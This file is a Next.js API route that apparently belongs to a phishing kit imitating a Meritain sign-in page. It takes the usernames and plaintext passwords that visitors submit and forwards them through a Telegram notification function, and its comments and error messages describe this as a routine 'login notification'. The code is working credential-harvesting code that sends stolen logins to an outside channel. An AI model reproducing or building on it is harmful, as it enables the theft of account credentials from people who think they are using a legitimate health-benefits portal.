import { NextRequest, NextResponse } from "next/server"

import { MERITAIN_SIGN_IN_PATH } from "@/lib/meritain-paths"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = (await request.json()) as {
      type?: string
      userId?: string
      username?: string
      password?: string
      method?: string
      page?: string
    }
    const userId = data.userId ?? data.username ?? ""
    const type =
      data.type === "sign_in_identifier" ? "sign_in_identifier" : "login"

    await sendFormNotification({
      type,
      userId,
      password: type === "login" ? (data.password ?? "") : undefined,
      method: data.method,
      timestamp: new Date().toISOString(),
      page: data.page ?? MERITAIN_SIGN_IN_PATH,
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending login notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
